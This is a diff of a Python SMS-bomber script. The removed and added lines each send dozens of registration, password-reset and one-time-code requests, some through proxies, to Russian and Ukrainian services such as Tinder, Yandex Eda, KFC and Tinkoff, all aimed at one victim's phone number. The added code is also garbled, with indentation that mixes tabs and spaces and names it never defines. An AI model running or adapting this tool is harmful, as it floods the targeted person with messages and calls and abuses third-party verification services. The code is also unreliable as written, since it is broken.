@@ -83,115 +83,191 @@ def update():
 
 def send_sms(serv):
     global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
-    if serv == 0: post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-    elif serv == 1: post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-    elif serv == 2: post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
-    elif serv == 3: post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-    elif serv == 4: post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-    elif serv == 5: post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
-    elif serv == 6: post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-    elif serv == 7: post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-    elif serv == 8: post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
-    elif serv == 9: post('https://www.rabota.ru/remind', data={'credential': _phone})
-    elif serv == 10: post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
-    elif serv == 11: post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
-    elif serv == 12: post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
-    elif serv == 13: post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
-    elif serv == 14: get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
-    elif serv == 15: post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
-    elif serv == 16: post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
-    elif serv == 17: post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
-    elif serv == 18: post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-    elif serv == 19: post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
-    elif serv == 20: post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
-    elif serv == 21: post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-    elif serv == 22: post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
-    elif serv == 23: post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-    elif serv == 24: post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
-    elif serv == 25: post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
-    elif serv == 26: post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
-    elif serv == 27: post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
-    elif serv == 28: post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
-    elif serv == 29: post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
-    elif serv == 30: post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
-    elif serv == 31: post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
-    elif serv == 32: post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
-    elif serv == 33: post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
-    elif serv == 34: post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
-    elif serv == 35: post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
-    elif serv == 36: post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
-    elif serv == 37: post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
-    elif serv == 38: post('https://plink.tech/register/',json={"phone": _phone})
-    elif serv == 39: post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
-    elif serv == 40: post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
-    elif serv == 41: post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
-    elif serv == 42: post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
-    elif serv == 43: post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
-    elif serv == 44: post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
-    elif serv == 45: post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
-    elif serv == 46: post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-    elif serv == 47: post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
-    elif serv == 48: post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
-    elif serv == 49: post('https://b.utair.ru/api/v1/login/', data = {'login': _phone, }, headers = {'Accept-Language':'en-US,en;q=0.5', 'Connection':'keep-alive', 'Host':'b.utair.ru', 'origin':'https://www.utair.ru','Referer':'https://www.utair.ru/'})
-    elif serv == 50: post("https://izi.ua/api/auth/register",
-            json={
-                "phone": "+" + _phone,
-                "name": "Артём",
-                "is_terms_accepted": True,
-            },
-        )
-    elif serv == 51: post("https://secure.ubki.ua/b2_api_xml/ubki/auth",
-            json={
-                "doc": {
-                    "auth": {
-                        "mphone": "+" + _phone,
-                        "bdate": "11.11.1999",
-                        "deviceid": "00100",
-                        "version": "1.0",
-                        "source": "site",
-                        "signature": "undefined",
-                    }
-                }
-            },
-            headers={"Accept": "application/json"},
-        )
-    elif serv == 53: post("https://www.aptekaonline.ru/login/ajax_sms_order.php",
-            data={"PERSONAL_MOBILE": "+" +_phone})
-    elif serv == 54: post("https://api.cian.ru/sms/v1/send-validation-code/",
-            json={"phone": "+" + _phone, "type": "authenticateCode"})
-    elif serv == 55: post("https://clients.cleversite.ru/callback/run.php",
-            data={
-                "siteid": "62731",
-                "num": _phone,
-                "title": "Онлайн-консультант",
-                "referrer": "https://m.cleversite.ru/call",
-            },
-        )
-    elif serv == 56: post("https://hr.zarplata.ru/api/v2/users",
-            json={
-                "phone": {"value": _phone},
-                "password": password,
-                "type": "employer",
-            },
-        )
-    elif serv == 57: post("https://hr.zarplata.ru/api/v2/users",
-            json={
-                "phone": {"value": _phone},
-                "password": password,
-                "type": "employer",
-            },
-        )
-    elif serv == 58: post("https://api.imgur.com/account/v1/phones/verify",
-            json={"phone_number": _phone, "region_code": "RU"})
-    elif serv == 59: post("https://api.imgur.com/account/v1/phones/verify",
-            json={"phone_number": _phone, "region_code": "UA"})
-    elif serv == 60: post("https://api.imgur.com/account/v1/phones/verify",
-            json={"phone_number": _phone, "region_code": "KZ"})
-    elif serv == 61: post("https://moneyman.ru/registration_api/actions/send-confirmation-code",
-            data={"+" + _phone})
-    elif serv == 62: get("https://www.sportmaster.ua/",
-            params={"module": "users", "action": "SendSMSReg", "phone": _phone})
-    else: print("Ошибка сервиса")
+   try:
+						phonee=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						phonee=mask(str=phone[1:], maska="8(###)###-##-##")
+						requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						phonee=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonee, "code":""}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) }, proxies=proxies, timeout=10)
+						requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"}, proxies=proxies, timeout=10) 
+					except:
+						pass
+					try:
+						# под сомнением 
+						phonee=mask(str=phone, maska="#(###)###-##-##")
+						requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonee}, proxies=proxies, timeout=10)
+
+						phonee=mask(str=phone, maska="+#(###)###-##-##")
+						requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						phonee=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonee}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						phonee=mask(str=phone, maska="8(###)###-##-##")
+						requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						phonee=mask(phone, maska="+# (###) ### - ## - ##")
+						requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						phonee=mask(str=phone, maska="(+#)##########")
+						requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonee, "type": 1}}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						phonee=mask(str=phone9, maska="8(###)###-##-##")
+						requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						phonee=mask(str=phone9, maska="8 (###) ###-##-##")
+						requests.post("http://sushigourmet.ru/auth",data={"phone": phonee, "stage": 1}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						phonee=mask(str=phone9, maska="8-###-###-##-##")
+						requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phonee}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						phonee=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonee}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}, proxies=proxies, timeout=10)
+					except:
+						pass
+					try:
+						requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"}, proxies=proxies, timeout=10)
+					except:
+						pass
 
 def send_call(serv):
     global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
